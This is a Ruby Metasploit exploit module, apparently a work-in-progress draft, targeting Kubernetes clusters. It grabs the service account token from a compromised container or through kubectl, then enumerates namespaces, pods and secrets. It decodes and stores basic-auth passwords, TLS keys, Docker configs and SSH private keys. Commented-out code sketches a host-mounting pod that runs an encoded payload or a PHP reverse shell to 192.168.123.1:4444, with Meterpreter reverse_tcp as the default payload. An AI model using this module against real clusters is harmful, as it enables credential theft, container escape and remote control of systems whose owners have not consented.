# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module Kubernetes
  module Error
    class ApiError < ::StandardError
    end

    class AuthenticationError < ApiError
    end

    class UnexpectedStatusCode < ApiError
      attr_reader :status_code

      def initialize(status_code)
        super
        @status_code = status_code
      end
    end
  end

  module Secret
    #
    # Secret types:
    #   https://kubernetes.io/docs/concepts/configuration/secret/
    #

    # Arbitrary user-defined data
    Opaque = 'Opaque'

    # service account token
    ServiceAccountToken = 'kubernetes.io/service-account-token'

    # serialized ~/.dockercfg file
    DockerConfiguration = 'kubernetes.io/dockercfg'

    # serialized ~/.docker/config.json file
    DockerConfigurationJson = 'kubernetes.io/dockerconfigjson'

    # credentials for basic authentication
    BasicAuth = 'kubernetes.io/basic-auth'

    # credentials for SSH authentication
    SSHAuth = 'kubernetes.io/ssh-auth'

    # data for a TLS client or server
    TLSAuth = 'kubernetes.io/tls'

    # bootstrap token data
    BootstrapTokenData = 'bootstrap.kubernetes.io/token'
  end

  class Client
    def initialize(config)
      @http_client = config.fetch(:http_client)
      @token = config[:token]
    end

    def list_namespace(options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri('/api/v1/namespaces')
        },
        options
      )

      json
    end

    def list_secret(namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/secrets")
        },
        options
      )

      json
    end

    def list_pod(namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods")
        },
        options
      )

      json
    end

    def create_pod(data, namespace, options = {})
      res, json = call_api(
        {
          'method' => 'POST',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods"),
          'data' => JSON.pretty_generate(data)
        },
        options
      )

      if res.code != 201
        raise Kubernetes::Error::UnexpectedStatusCode.new(res.code)
      end

      json
    end

    def delete_pod(name, namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'DELETE',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods/#{name}"),
          'headers' => {}
        },
        options
      )

      json
    end

    private

    attr_reader :http_client

    # TODO: Support receiving data directly as a table?
    # Accept: application/json;as=Table;g=meta.k8s.io;v=v1beta1
    # https://kubernetes.io/docs/reference/using-api/api-concepts/#receiving-resources-as-tables
    def call_api(request, options = {})
      token = options.fetch(:token, @token)

      res = http_client.send_request_raw(
        request.merge(
          {
            'headers' => request.fetch('headers', {}).merge(
              {
                'Authorization' => "Bearer #{token}",
                'Accept' => 'application/json'
              }
            )
          }
        )
      )

      if res.nil? || res.body.nil?
        raise Kubernetes::Error::ApiError
      elsif res.code == 401
        raise Kubernetes::Error::AuthenticationError
      end

      json = res.get_json_document
      if json.nil?
        raise Kubernetes::Error::ApiError
      end

      [res, json.deep_symbolize_keys]
    end
  end
end

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'kubernetes',
        'Description' => %q{
          kubernetes

          usage:

          rerun session=-1 https://kubernetes.docker.internal:6443 verbose=true lhost=192.168.123.1
        },
        'License' => MSF_LICENSE,
        'Author' => [
        ],
        'References' => [
          # ['URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
        ],
        'Stance' => Msf::Exploit::Stance::Aggressive,
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          # 'SideEffects' => [ ARTIFACTS_ON_DISK ],
          # 'Reliability' => [ UNRELIABLE_SESSION ],
          # 'Stability' => [ SERVICE_RESOURCE_LOSS ]
        },
        'DefaultOptions' => {
          'SSL' => true
        },
        'Targets' => [
          [
            'Linux x86',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux x86_64',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X64,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'php',
            {
              'Platform' => 'php',
              'Arch' => [ARCH_PHP],
              'PAYLOAD' => 'php/meterpreter/reverse_tcp',
            }
          ],

        ],
        # 'DisclosureDate' => '2020-01-22',
        'DefaultTarget' => 0
      # 'Compat' => {
      #   'Meterpreter' => {
      #     'Commands' => %w[
      #       stdapi_sys_process_execute
      #     ]
      #   }
      # }
      )
    )

    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        Opt::RPORT(6443),
        OptRegexp.new('HIGHLIGHT_PATTERN', [true, 'PCRE regex of names to highlight', 'username|password|user|pass']),
      ]
    )
    # https://kubernetes.docker.internal:6443
  end

  def setup
  end

  def check
    # For the check command
  end

  def exploit
    # Hack for now, running remotely versus compromised container
    if session
      print_status("extracting service token from session")
      token = read_file('/run/secrets/kubernetes.io/serviceaccount/token')
      unless token.nil?
        p = store_loot("jwt", "text/plain", session, token, "token", "kubernetes service token")
        vprint_good("kubernetes service token saved: #{p}")
      end
    else
      # grab kube-system token from the host
      print_status("extracting service token from host")
      token = `kubectl get secret -n kube-system $(kubectl -n kube-system get serviceaccount default -o jsonpath="{.secrets[0].name}") -o jsonpath="{.data.token}" | base64 --decode`
    end

    kubernetes_client = Kubernetes::Client.new({ http_client: self, token: token })
    extract_namespaces(kubernetes_client)

    print_good("Creating new pod with kubernetes token")

    # TODO: Choose this based on whether it's a remote exploit, or through a session
    # namespace_name = namespaces.first.dig(:metadata, :name)
    # image_name = kubernetes_client.list_pod(namespace_name).dig(:items, 0, :spec, :containers, 0, :image)
    random_identifiers = Rex::RandomIdentifier::Generator.new({ char_set: Rex::Text::LowerAlpha })
    #
    # cmd = "echo -n  #{Rex::Text.encode_base64("#{payload.encoded_exe}")} | base64 --decode > shell; chmod +x shell; ./shell"
    # cmd = "echo -n #{Rex::Text.encode_base64("#{payload.encoded}")} | base64 --decode | php -e"
    # cmd = "php -r '$sock=fsockopen(\"192.168.123.1\",4444);exec(\"sh <&3 >&3 2>&3\");'"

    # print_good cmd
    # new_pod_definition = {
    #   apiVersion: 'v1',
    #   kind: 'Pod',
    #   metadata: {
    #     name: random_identifiers[:pod_name],
    #     labels: {}
    #   },
    #   spec: {
    #     containers: [
    #       {
    #         name: random_identifiers[:container_name],
    #         image: image_name,
    #
    #         command: [
    #           "/bin/sh",
    #           "-c",
    #           cmd
    #         ],
    #
    #         # TODO: Alternative approach, sleep, then exec out of band, either with a reverse shell payload, or potentially use the stream api
    #         # Has the benefit of not crash looping and causing detection
    #         # command: [
    #         #   "/bin/sh",
    #         #   "-c",
    #         #   "sleep 20000"
    #         # ],
    #
    #         volumeMounts: [
    #           {
    #             mountPath: '/host_mnt',
    #             name: random_identifiers[:volume_name],
    #           }
    #         ]
    #       }
    #     ],
    #     volumes: [
    #       {
    #         name: random_identifiers[:volume_name],
    #         hostPath: {
    #           # path: '/'
    #           path: '/Users'
    #         }
    #       }
    #     ]
    #   }
    # }

    # pod_result = kubernetes_client.create_pod(
    #   new_pod_definition,
    #   namespace_name
    # )
    #
    # print_good "Pod created: #{random_identifiers[:pod_name]}"
    # print_good "Waiting for shell..."
    # TODO: Poll for success
    #
  end

  def extract_namespaces(kubernetes_client)
    print_good("Extracting namespaces")
    namespaces = kubernetes_client.list_namespace[:items]

    origin = create_credential_origin_service(
      {
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        service_name: 'kubernetes',
        protocol: 'tcp',
        module_fullname: fullname,
        workspace_id: myworkspace_id
      }
    )

    # create_credential_login(login_data)
    # Print the available namespaces first
    print_namespaces(namespaces)

    # Split the information for each namespace separately
    namespaces.each do |namespace|
      namespace_name = namespace.dig(:metadata, :name)
      print_good("Namespace: #{namespace_name}")

      pods = kubernetes_client.list_pod(namespace_name)[:items]
      print_pods(namespace, pods)

      secrets = kubernetes_client.list_secret(namespace_name)[:items]
      print_secrets(namespace, secrets)
      report_secrets(origin, secrets)

      # secrets = kubernetes_client.list_config_map(namespace_name)[:items]
      # print_config_maps(namespace, secrets)
    end
  end

  def print_namespaces(namespaces)
    table = create_table(
      'Header' => 'Namespaces',
      'Columns' => ['#', 'name'],
    )

    namespaces.each.with_index do |item, i|
      table << [
        i,
        item.dig(:metadata, :name)
      ]
    end

    print_table(table)
  end

  def print_pods(namespace, pods)
    namespace_name = namespace.dig(:metadata, :name)
    table = create_table(
      'Header' => "Pods (namespace: #{namespace_name})",
      'Columns' => ['#', 'namespace', 'name', 'status', 'containers']
    )

    pods.each.with_index do |item, i|
      containers = item.dig(:spec, :containers).map { |container| "#{container[:name]} (#{container[:image]})" }
      table << [
        i,
        namespace_name,
        item.dig(:metadata, :name),
        item.dig(:status, :phase),
        containers.join(', ')
      ]
    end

    print_table(table)
  end

  def print_secrets(namespace, secrets)
    # https://kubernetes.io/docs/concepts/configuration/secret/#secret-types
    namespace_name = namespace.dig(:metadata, :name)
    table = create_table(
      'Header' => "Secrets (namespace: #{namespace_name})",
      'Columns' => ['#', 'namespace', 'name', 'type', 'data', 'age'],
    )

    secrets.each.with_index do |item, i|
      table << [
        i,
        namespace_name,
        item.dig(:metadata, :name),
        item.dig(:type),
        item.fetch(:data, {}).keys.join(','),
        item.dig(:metadata, :creationTimestamp)
      ]
    end

    print_table(table)
  end

  # Extract fields from the various secrets supported by Kubernetes:
  # https://github.com/kubernetes/kubernetes/blob/a53e2eaeaba064309dceca2dc27f3ac09c6375b0/pkg/apis/core/validation/validation.go#L5272
  def report_secrets(origin, secrets)
    secrets.each do |secret|
      credential_data = {
        origin: origin,
        origin_type: :service,
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      namespace_name = secret.dig(:metadata, :namespace)
      resource_name = secret.dig(:metadata, :name)
      loot_name_prefix = [
        datastore['RHOST'],
        namespace_name,
        resource_name
      ].join('_')

      case secret[:type]
      when Kubernetes::Secret::BasicAuth
        username = Rex::Text.decode_base64(secret.dig(:data, :username))
        password = Rex::Text.decode_base64(secret.dig(:data, :password))

        credential = credential_data.merge(
          {
            username: username,
            private_type: :password,
            private_data: password
          }
        )

        print_good("basic_auth #{resource_name}: #{username}:#{password}")
        create_credential(credential)
      when Kubernetes::Secret::TLSAuth
        tls_cert = Rex::Text.decode_base64(secret.dig(:data, :"tls.crt"))
        tls_key = Rex::Text.decode_base64(secret.dig(:data, :"tls.key"))
        tls_subject = OpenSSL::X509::Certificate.new(tls_cert).subject rescue nil
        loot_name = loot_name_prefix + (tls_subject ? tls_subject.to_a.map { |name, data, _type| "#{name}-#{data}" }.join("-") : '')

        path = store_loot("tls.key", 'text/plain', nil, tls_key, "#{loot_name}.key")
        print_good("tls_key #{resource_name}: #{path}")

        path = store_loot("tls.cert", 'text/plain', nil, tls_cert, "#{loot_name}.crt")
        print_good("tls_cert #{resource_name}: #{path} (#{tls_subject ? tls_subject : "No Subject"})")
      when Kubernetes::Secret::DockerConfigurationJson
        json = Rex::Text.decode_base64(secret.dig(:data, :".dockerconfigjson"))
        loot_name = loot_name_prefix + "-json"

        path = store_loot("docker.json", 'application/json', nil, json, loot_name)
        print_good("dockerconfig json #{resource_name}: #{path}")
      when Kubernetes::Secret::SSHAuth
        data = Rex::Text.decode_base64(secret.dig(:data, :"ssh-privatekey"))
        loot_name = loot_name_prefix + "-ssh_key"
        private_key = parse_private_key(data)

        credential = credential_data.merge(
          {
            private_type: :ssh_key,
            public_data: private_key&.public_key,
            private_data: private_key
          }
        )
        begin
          create_credential(credential)
        rescue => _e
          vprint_error("Unable to store #{loot_name} as a valid ssh_key pair")
        end

        path = store_loot("id_rsa", 'text/plain', nil, json, loot_name)
        print_good("ssh_key #{resource_name}: #{path}")
      end
    rescue => e
      elog("Failed parsing secret #{resource_name}", error: e)
      print_error("Failed parsing secret #{resource_name}: #{e.message}")
    end
  end

  def create_table(options)
    default_options = {
      'Indent' => indent_level,
      # For now, don't perform any word wrapping on the table as it breaks the workflow of
      # copying container/secret names
      'WordWrap' => false,
      'ColProps' => {
        'data' => {
          'Stylers' => [Msf::Ui::Console::TablePrint::HighlightSubstringStyler.new([datastore['HIGHLIGHT_PATTERN']])]
        },
        'name' => {
          'Stylers' => [Msf::Ui::Console::TablePrint::HighlightSubstringStyler.new([datastore['HIGHLIGHT_PATTERN']])]
        },
        'age' => {
          'Formatters' => [Msf::Ui::Console::TablePrint::AgeFormatter.new],
        }
      }
    }

    Rex::Text::Table.new(default_options.merge(options))
  end

  def indent_level
    2
  end

  def print_table(table)
    print(table.to_s)
    print_line("#{' ' * indent_level}No rows") if table.rows.empty?
    print_line
  end

  def parse_private_key(data)
    passphrase = nil
    ask_passphrase = false

    private_key = Net::SSH::KeyFactory.load_data_private_key(data, passphrase, ask_passphrase)
    private_key
  rescue => _e
    nil
  end
end
